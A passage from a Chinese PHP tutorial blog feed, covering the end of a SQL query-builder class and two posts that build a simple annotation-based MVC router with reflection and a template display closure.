class="string">')'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            //如果是字符串说明传的是表名</span><br><span class="line">            <span class="keyword">if</span> (is_string(<span class="variable">$param</span>)) &#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;__add(<span class="string">"insertinto"</span>, <span class="variable">$param</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (is_callable(<span class="variable">$param</span>)) &#123;</span><br><span class="line">                <span class="variable">$callback</span>[]=<span class="variable">$param</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        foreach (<span class="variable">$callback</span> as <span class="variable">$call</span>) &#123;</span><br><span class="line">            <span class="variable">$call</span>(<span class="variable">$this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    //排序</span><br><span class="line">    <span class="keyword">function</span> orderby(<span class="variable">$str</span>, <span class="variable">$order</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$order</span>=<span class="string">' '</span>.<span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_array(<span class="variable">$str</span>)) &#123;</span><br><span class="line">            <span class="variable">$tb</span>=key(<span class="variable">$str</span>);</span><br><span class="line">            <span class="variable">$this</span>-&gt;__add(__FUNCTION__, <span class="variable">$this</span>-&gt;_aliastb(<span class="variable">$tb</span>).<span class="string">'.'</span>.<span class="variable">$str</span>[<span class="variable">$tb</span>].<span class="variable">$order</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;__add(__FUNCTION__, <span class="variable">$str</span>.<span class="variable">$order</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    //给表加别名</span><br><span class="line">    public <span class="keyword">function</span> _aliastb(<span class="variable">$tbName</span>) &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="string">' _'</span>.<span class="variable">$tbName</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> from(<span class="variable">$tableName</span>)//处理from过程</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array(<span class="variable">$tableName</span>)) &#123;//是数组的话就是代表多张表关联</span><br><span class="line">            <span class="keyword">if</span> (count(<span class="variable">$tableName</span>)!=2) <span class="built_in">return</span> <span class="variable">$this</span>;//参数值类似[[<span class="string">"name"</span>=&gt;classid<span class="string">""</span>],[<span class="string">"name_class"</span>]=&gt;<span class="string">"id"</span>],小于2灭有意义</span><br><span class="line">            <span class="variable">$tb1</span>=current(<span class="variable">$tableName</span>);</span><br><span class="line">            <span class="variable">$tb2</span>=next(<span class="variable">$tableName</span>);</span><br><span class="line"></span><br><span class="line">            //第一步，把表的key值作为from参数进行处理</span><br><span class="line">            <span class="variable">$tb1_key</span>=key(<span class="variable">$tb1</span>);</span><br><span class="line">            <span class="variable">$tb1_value</span>=<span class="variable">$tb1</span>[<span class="variable">$tb1_key</span>];</span><br><span class="line"></span><br><span class="line">            <span class="variable">$tb2_key</span>=key(<span class="variable">$tb2</span>);</span><br><span class="line">            <span class="variable">$tb2_value</span>=<span class="variable">$tb2</span>[<span class="variable">$tb2_key</span>];</span><br><span class="line"></span><br><span class="line">            <span class="variable">$this</span>-&gt;__add(__FUNCTION__, <span class="variable">$tb1_key</span>);</span><br><span class="line">            <span class="variable">$this</span>-&gt;__add(__FUNCTION__, <span class="variable">$tb2_key</span>);</span><br><span class="line"></span><br><span class="line">            //第二步，拼凑<span class="built_in">where</span>条件</span><br><span class="line">            <span class="variable">$whereString</span>=<span class="string">' _'</span>.<span class="variable">$tb1_key</span>.<span class="string">'.'</span>.<span class="variable">$tb1_value</span>.<span class="string">'='</span>.<span class="string">"_"</span>.<span class="variable">$tb2_key</span>.<span class="string">'.'</span>.<span class="variable">$tb2_value</span>;</span><br><span class="line">            <span class="variable">$this</span>-&gt;<span class="built_in">where</span>(<span class="variable">$whereString</span>);</span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$this</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; //字符串则表示单张表查询</span><br><span class="line">            <span class="variable">$this</span>-&gt;__add(__FUNCTION__, <span class="variable">$tableName</span>);</span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="built_in">where</span>(<span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;__add(__FUNCTION__, <span class="variable">$str</span>, <span class="string">" and "</span>);</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span>  __add(<span class="variable">$key</span>,  <span class="variable">$str</span>,  <span class="variable">$spliter</span>=<span class="string">","</span>)//实现字符串的累加</span><br><span class="line">    &#123;</span><br><span class="line">        //调用不存在的方法，直接返回</span><br><span class="line">        <span class="keyword">if</span>(!array_key_exists(<span class="variable">$key</span>, <span class="variable">$this</span>-&gt;sql))   <span class="built_in">return</span> ;</span><br><span class="line">        <span class="keyword">if</span> (is_array(<span class="variable">$this</span>-&gt;sql[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            //如果已经存在该项表明我们不做什么处理</span><br><span class="line">            <span class="keyword">if</span> (!in_array(<span class="variable">$str</span>, <span class="variable">$this</span>-&gt;sql[<span class="variable">$key</span>][1])) &#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;sql[<span class="variable">$key</span>][1][]=<span class="variable">$str</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            //如果是字符串，直接进行字符串累加</span><br><span class="line">//            <span class="keyword">if</span> (trim(<span class="variable">$this</span>-&gt;sql[<span class="variable">$key</span>])!=<span class="variable">$key</span>)</span><br><span class="line">            <span class="keyword">if</span> (preg_replace(<span class="string">'/\s/'</span>, <span class="string">''</span>, <span class="variable">$this</span>-&gt;sql[<span class="variable">$key</span>])!=<span class="variable">$key</span> &amp;&amp; preg_replace(<span class="string">"/\s/"</span>, <span class="string">''</span>, <span class="variable">$this</span>-&gt;sql[<span class="variable">$key</span>])!=<span class="string">""</span>)</span><br><span class="line">                <span class="variable">$this</span>-&gt;sql[<span class="variable">$key</span>].=<span class="variable">$spliter</span>;</span><br><span class="line">            <span class="variable">$this</span>-&gt;sql[<span class="variable">$key</span>].=<span class="variable">$str</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        global <span class="variable">$map</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$map</span>=Closure::<span class="built_in">bind</span>(<span class="variable">$map</span> ,<span class="variable">$this</span>);</span><br><span class="line">        //</span><br><span class="line">        <span class="variable">$filter</span>=<span class="keyword">function</span> (<span class="variable">$value</span>, <span class="variable">$key</span>) &#123;</span><br><span class="line">//            <span class="keyword">if</span>(!is_string(<span class="variable">$value</span>)) <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(is_array(<span class="variable">$value</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span>(count(<span class="variable">$value</span>[1])&gt;0) <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            //如果是空字符串也不参与累加</span><br><span class="line">            <span class="keyword">if</span>(preg_replace(<span class="string">"/\s/"</span>, <span class="string">''</span>, <span class="variable">$value</span>)==<span class="variable">$key</span> || preg_replace(<span class="string">"/\s/"</span>, <span class="string">""</span>, <span class="variable">$value</span> )==<span class="string">""</span>)</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="variable">$this</span>-&gt;sql=array_filter(<span class="variable">$this</span>-&gt;sql, <span class="variable">$filter</span>, ARRAY_FILTER_USE_BOTH );</span><br><span class="line">        <span class="variable">$res</span>=array_map(<span class="variable">$map</span>, array_values(<span class="variable">$this</span>-&gt;sql));//</span><br><span class="line">        <span class="variable">$this</span>-&gt;sql=<span class="variable">$this</span>-&gt;sql_bak;</span><br><span class="line">        <span class="built_in">return</span> implode(array_values(<span class="variable">$res</span>), <span class="string">' '</span>);//把新的数组重新构建成一个字符串</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>里面涉及到一些比较平时很少接触到的函数如array_map,array_filter，当时自从php7出来之后，php也不仅仅是只能做网站了吧，还是要懂一些函数的妙用。下一节，将介绍，拼凑字符串与pdo的组合，并做一个简单的小demo。</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>php学习系列6</title>
      <link href="/2017/08/10/%E8%AE%A4%E7%9C%9F%E5%AD%A6%E4%B9%A0php%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-6/"/>
      <url>/2017/08/10/%E8%AE%A4%E7%9C%9F%E5%AD%A6%E4%B9%A0php%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-6/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="认真学习php面向对象-6"><a href="#认真学习php面向对象-6" class="headerlink" title="认真学习php面向对象-6"></a>认真学习php面向对象-6</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>准备写一个认真学习php面向对象的系列，使用php来做网页，没有深入了解php的话，可能三板斧就够了，并不需要有多高深！如有错误，欢迎各位不吝赐教！进度安排的话，我学到哪里，就更新到哪里了！形式的话就采用一个需求小案例，然后实现，并附上自己的总结，<a href="https://github.com/shisiying/phpOrinentedObject/tree/master" target="_blank" rel="noopener">文章源码</a></p><h3 id="需求-：1）模拟框架模板展示display方法显示view页面"><a href="#需求-：1）模拟框架模板展示display方法显示view页面" class="headerlink" title="需求 ：1）模拟框架模板展示display方法显示view页面"></a><strong>需求 ：1）模拟框架模板展示display方法显示view页面</strong></h3><p>上一节中，我们成功创建了路由资源文件并正确访问了我们定义的方法，那么这一节我们模拟框架常用的方display方法展示view页面。</p><h4 id="创建login-html"><a href="#创建login-html" class="headerlink" title="创建login.html "></a><strong>创建login.html </strong></h4><p><img src="http://img.blog.csdn.net/20170809225143088?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>在入口文件中，改写路由规则，强迫每个函数都有一个默认参数display，此处我们使用了匿名函数</p><h4 id="index-php"><a href="#index-php" class="headerlink" title="index.php "></a><strong>index.php </strong></h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">      <span class="keyword">function</span> getMatch(<span class="variable">$v</span>) &#123;</span><br><span class="line">          return preg_match(<span class="string">'/[a-zA-Z]+/'</span>,<span class="variable">$v</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$display</span>=<span class="keyword">function</span>(<span class="variable">$tpl</span>)&#123;</span><br><span class="line">            require (getcwd().<span class="string">'/vars'</span>);</span><br><span class="line">            include (getcwd().<span class="string">'/page/'</span>.<span class="variable">$tpl</span>.<span class="string">'.html'</span>);</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="variable">$pi</span>=<span class="variable">$_SERVER</span>[<span class="string">'PATH_INFO'</span>];</span><br><span class="line">      <span class="variable">$pi</span>=isset(<span class="variable">$_SERVER</span>[<span class="string">"PATH_INFO"</span>])?<span class="variable">$_SERVER</span>[<span class="string">"PATH_INFO"</span>]:false;</span><br><span class="line">      <span class="keyword">if</span>(!<span class="variable">$pi</span>) <span class="keyword">exit</span>(<span class="string">'404'</span>);</span><br><span class="line">      <span class="variable">$route</span>=require (<span class="string">"request_route"</span>);</span><br><span class="line">      <span class="variable">$route_keys</span>=array_keys(<span class="variable">$route</span>);</span><br><span class="line"></span><br><span class="line">      foreach (<span class="variable">$route_keys</span> as <span class="variable">$key</span>) &#123;</span><br><span class="line">          <span class="variable">$new_key</span>=str_replace(<span class="string">'/'</span>,<span class="string">'\/'</span>,<span class="variable">$key</span>);</span><br><span class="line">          <span class="keyword">if</span> (preg_match(<span class="string">'/'</span>.<span class="variable">$new_key</span>.<span class="string">'/'</span>,<span class="variable">$pi</span>,<span class="variable">$result</span>)) &#123;</span><br><span class="line">                  <span class="variable">$route_obj</span>=<span class="variable">$route</span>[<span class="variable">$key</span>];</span><br><span class="line">                  <span class="keyword">if</span> (<span class="variable">$route_obj</span>[<span class="string">'RequestMethod'</span>]==<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_METHOD'</span>]) &#123;</span><br><span class="line">                      <span class="variable">$className</span>=<span class="variable">$route_obj</span>[<span class="string">'Class'</span>];</span><br><span class="line">                      <span class="variable">$method</span>=<span class="variable">$route_obj</span>[<span class="string">'Method'</span>];</span><br><span class="line">                      require (getcwd().<span class="string">'/code/'</span>.<span class="variable">$className</span>.<span class="string">".class.php"</span>);</span><br><span class="line">                      <span class="variable">$params</span>=array_filter(<span class="variable">$result</span>,<span class="string">'getMatch'</span>,ARRAY_FILTER_USE_KEY);</span><br><span class="line">                      <span class="variable">$class_obj</span>=new ReflectionClass(<span class="variable">$className</span>);</span><br><span class="line">                      <span class="variable">$getMethod</span>=<span class="variable">$class_obj</span>-&gt;getMethod(<span class="variable">$method</span>);</span><br><span class="line">                      <span class="variable">$params</span>[<span class="string">'display'</span>]=<span class="variable">$display</span>;</span><br><span class="line">                      <span class="variable">$getMethod</span>-&gt;invokeArgs(<span class="variable">$class_obj</span>-&gt;newInstance(),<span class="variable">$params</span>);</span><br><span class="line"><span class="regexp">//</span>                      <span class="keyword">if</span>(<span class="variable">$params</span> &amp;&amp; count(<span class="variable">$params</span>)&gt;<span class="number">0</span>) &#123;</span><br><span class="line"><span class="regexp">//</span>                          <span class="variable">$getMethod</span>-&gt;invokeArgs(<span class="variable">$class_obj</span>-&gt;newInstance(),<span class="variable">$params</span>);</span><br><span class="line"><span class="regexp">//</span>                      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="regexp">//</span>                          <span class="variable">$getMethod</span>-&gt;invoke(<span class="variable">$class_obj</span>-&gt;newInstance());</span><br><span class="line"><span class="regexp">//</span>                      &#125;</span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                      <span class="keyword">exit</span>(<span class="string">'not allowed!'</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h4 id="Index-class-php"><a href="#Index-class-php" class="headerlink" title="Index.class.php "></a><strong>Index.class.php </strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@RequestMapping</span>("/login",Method=GET)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($display)</span> </span>&#123;</span><br><span class="line">       $display(<span class="string">'login'</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>记得写完之后，需要编译一下，生成路由资源文件，并且开启php内置服务器，访问<br><img src="http://img.blog.csdn.net/20170809225636060?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br><img src="http://img.blog.csdn.net/20170809225646730?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a><strong>效果</strong></h4><p><img src="http://img.blog.csdn.net/20170809225737261?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>php学习系列5</title>
      <link href="/2017/08/09/%E8%AE%A4%E7%9C%9F%E5%AD%A6%E4%B9%A0php%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-5/"/>
      <url>/2017/08/09/%E8%AE%A4%E7%9C%9F%E5%AD%A6%E4%B9%A0php%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-5/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="认真学习php面向对象-5"><a href="#认真学习php面向对象-5" class="headerlink" title="认真学习php面向对象-5"></a>认真学习php面向对象-5</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>准备写一个认真学习php面向对象的系列，使用php来做网页，没有深入了解php的话，可能三板斧就够了，并不需要有多高深！如有错误，欢迎各位不吝赐教！进度安排的话，我学到哪里，就更新到哪里了！形式的话就采用一个需求小案例，然后实现，并附上自己的总结，<a href="https://github.com/shisiying/phpOrinentedObject/tree/master" target="_blank" rel="noopener">文章源码</a></p><h3 id="需求-：1）模拟mvc实现浏览器正确访问"><a href="#需求-：1）模拟mvc实现浏览器正确访问" class="headerlink" title="需求 ：1）模拟mvc实现浏览器正确访问"></a><strong>需求 ：1）模拟mvc实现浏览器正确访问</strong></h3><p>在上一节中我们已经模拟生成了路由资源文件，这一节我们根据浏览器的正确访问来加载我们的资源文件。</p><h4 id="创建index-php"><a href="#创建index-php" class="headerlink" title="创建index.php "></a><strong>创建index.php </strong></h4><p>   <img src="http://img.blog.csdn.net/20170808170558627?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h4 id="index-php"><a href="#index-php" class="headerlink" title="index.php "></a><strong>index.php </strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="variable">$pi</span>=<span class="variable">$_SERVER</span>[<span class="string">'PATH_INFO'</span>];</span><br><span class="line">//    <span class="variable">$controller</span>=explode(<span class="string">'/'</span>,<span class="variable">$pi</span>)[1];</span><br><span class="line">//    <span class="variable">$method</span>=explode(<span class="string">'/'</span>,<span class="variable">$pi</span>)[2];</span><br><span class="line">//    require (getcwd().<span class="string">'/code/'</span>.<span class="variable">$controller</span>.<span class="string">".class.php"</span>);</span><br><span class="line">//    <span class="variable">$get_class</span>=new <span class="variable">$controller</span>();</span><br><span class="line">//    <span class="variable">$get_class</span>-&gt;<span class="variable">$method</span>();</span><br><span class="line">      <span class="variable">$pi</span>=isset(<span class="variable">$_SERVER</span>[<span class="string">"PATH_INFO"</span>])?<span class="variable">$_SERVER</span>[<span class="string">"PATH_INFO"</span>]:<span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">if</span>(!<span class="variable">$pi</span>) <span class="built_in">exit</span>(<span class="string">'404'</span>);</span><br><span class="line">      <span class="variable">$route</span>=require (<span class="string">"request_route"</span>);</span><br><span class="line">      <span class="keyword">if</span> (array_key_exists(<span class="variable">$pi</span>,<span class="variable">$route</span>)) &#123;</span><br><span class="line">          <span class="variable">$route_obj</span>=<span class="variable">$route</span>[<span class="variable">$pi</span>];</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable">$route_obj</span>[<span class="string">'RequestMethod'</span>]==<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_METHOD'</span>]) &#123;</span><br><span class="line">              <span class="variable">$className</span>=<span class="variable">$route_obj</span>[<span class="string">'Class'</span>];</span><br><span class="line">              <span class="variable">$method</span>=<span class="variable">$route_obj</span>[<span class="string">'Method'</span>];</span><br><span class="line">              require (getcwd().<span class="string">'/code/'</span>.<span class="variable">$className</span>.<span class="string">".class.php"</span>);</span><br><span class="line">              <span class="variable">$class_obj</span>=new <span class="variable">$className</span>();</span><br><span class="line">              <span class="variable">$class_obj</span>-&gt;<span class="variable">$method</span>();</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="built_in">exit</span>(<span class="string">'not allowed!'</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="built_in">exit</span>(<span class="string">'404'</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a><strong>效果</strong></h4><p>访问存在的路由<br><img src="http://img.blog.csdn.net/20170808191839581?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>访问不存在的路由<br><img src="http://img.blog.csdn.net/20170808191859257?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h3 id="需求-：2）模拟mvc-url参数注入"><a href="#需求-：2）模拟mvc-url参数注入" class="headerlink" title="需求 ：2）模拟mvc url参数注入"></a><strong>需求 ：2）模拟mvc url参数注入</strong></h3><p>在上一节中我们已经模拟生成了路由资源文件，这一节我们根据浏览器的正确访问来加载我们的资源文件。</p><h4 id="index-class-php"><a href="#index-class-php" class="headerlink" title="index.class.php "></a><strong>index.class.php </strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> /**</span><br><span class="line"> * @Controller</span><br><span class="line"> */</span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    /**</span><br><span class="line">     * @RequestMapping(<span class="string">"/getseven/(?&lt;name&gt;\w&#123;2,10&#125;)"</span>,Method=GET)</span><br><span class="line">     */</span><br><span class="line">    public <span class="keyword">function</span> seven(<span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"This is default "</span>.<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * @RequestMapping(<span class="string">"/getage"</span>,Method=POST)</span><br><span class="line">     */</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">shisiying</span></span>() &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"This is index"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="index-php-1"><a href="#index-php-1" class="headerlink" title="index.php "></a><strong>index.php </strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> getMatch(<span class="variable">$v</span>) &#123;</span><br><span class="line">         <span class="built_in">return</span> preg_match(<span class="string">'/[a-zA-Z]+/'</span>,<span class="variable">$v</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="variable">$pi</span>=<span class="variable">$_SERVER</span>[<span class="string">'PATH_INFO'</span>];</span><br><span class="line">     <span class="variable">$pi</span>=isset(<span class="variable">$_SERVER</span>[<span class="string">"PATH_INFO"</span>])?<span class="variable">$_SERVER</span>[<span class="string">"PATH_INFO"</span>]:<span class="literal">false</span>;</span><br><span class="line">     <span class="keyword">if</span>(!<span class="variable">$pi</span>) <span class="built_in">exit</span>(<span class="string">'404'</span>);</span><br><span class="line">     <span class="variable">$route</span>=require (<span class="string">"request_route"</span>);</span><br><span class="line">     <span class="variable">$route_keys</span>=array_keys(<span class="variable">$route</span>);</span><br><span class="line"></span><br><span class="line">     foreach (<span class="variable">$route_keys</span> as <span class="variable">$key</span>) &#123;</span><br><span class="line">         <span class="variable">$new_key</span>=str_replace(<span class="string">'/'</span>,<span class="string">'\/'</span>,<span class="variable">$key</span>);</span><br><span class="line">         <span class="keyword">if</span> (preg_match(<span class="string">'/'</span>.<span class="variable">$new_key</span>.<span class="string">'/'</span>,<span class="variable">$pi</span>,<span class="variable">$result</span>)) &#123;</span><br><span class="line">                 <span class="variable">$route_obj</span>=<span class="variable">$route</span>[<span class="variable">$key</span>];</span><br><span class="line">                 <span class="keyword">if</span> (<span class="variable">$route_obj</span>[<span class="string">'RequestMethod'</span>]==<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_METHOD'</span>]) &#123;</span><br><span class="line">                     <span class="variable">$className</span>=<span class="variable">$route_obj</span>[<span class="string">'Class'</span>];</span><br><span class="line">                     <span class="variable">$method</span>=<span class="variable">$route_obj</span>[<span class="string">'Method'</span>];</span><br><span class="line">                     require (getcwd().<span class="string">'/code/'</span>.<span class="variable">$className</span>.<span class="string">".class.php"</span>);</span><br><span class="line">                     <span class="variable">$params</span>=array_filter(<span class="variable">$result</span>,<span class="string">'getMatch'</span>,ARRAY_FILTER_USE_KEY);</span><br><span class="line">                     <span class="variable">$class_obj</span>=new ReflectionClass(<span class="variable">$className</span>);</span><br><span class="line">                     <span class="variable">$getMethod</span>=<span class="variable">$class_obj</span>-&gt;getMethod(<span class="variable">$method</span>);</span><br><span class="line"></span><br><span class="line">                     <span class="keyword">if</span>(<span class="variable">$params</span> &amp;&amp; count(<span class="variable">$params</span>)&gt;0) &#123;</span><br><span class="line">                         <span class="variable">$getMethod</span>-&gt;invokeArgs(<span class="variable">$class_obj</span>-&gt;newInstance(),<span class="variable">$params</span>);</span><br><span class="line">                     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                         <span class="variable">$getMethod</span>-&gt;invoke(<span class="variable">$class_obj</span>-&gt;newInstance());</span><br><span class="line">                     &#125;</span><br><span class="line">                 &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                     <span class="built_in">exit</span>(<span class="string">'not allowed!'</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><h4 id="效果-1"><a href="#效果-1" class="headerlink" title="效果 "></a><strong>效果 </strong></h4><p><img src="http://img.blog.csdn.net/20170808223603277?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" 